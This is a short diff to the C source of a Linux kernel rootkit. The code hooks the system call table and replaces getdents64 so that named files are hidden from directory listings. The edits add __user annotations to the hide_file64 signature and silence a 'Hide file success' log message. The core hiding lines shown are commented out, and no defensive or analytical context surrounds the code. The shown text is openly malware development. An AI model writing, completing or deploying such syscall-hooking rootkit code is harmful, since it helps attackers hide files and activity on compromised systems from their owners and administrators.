@@ -14,7 +14,7 @@ MODULE_DESCRIPTION("Rootkit main entry");
 /*************** Methods declaration ********************/
 // Hook system call table and hide file by name
 static unsigned long **hook_syscall_table(void);
-static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count);
+static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
 // Kernel system call
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 // Faked system call
@@ -74,7 +74,7 @@ unsigned long ** hook_syscall_table(void)
  * @param count : the size of this structure
  * @return 
  */
-static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
+static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
 {
     struct linux_dirent64 *dp;
     long cur_addr, cur_reclen;
@@ -93,7 +93,7 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
 //            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
 //            count -= cur_reclen;                                     // Modify the size
             
-              printk("Hide %s file success.\n", dp->d_name);
+//              printk("Hide %s file success.\n", dp->d_name);
 //        }
     }
 
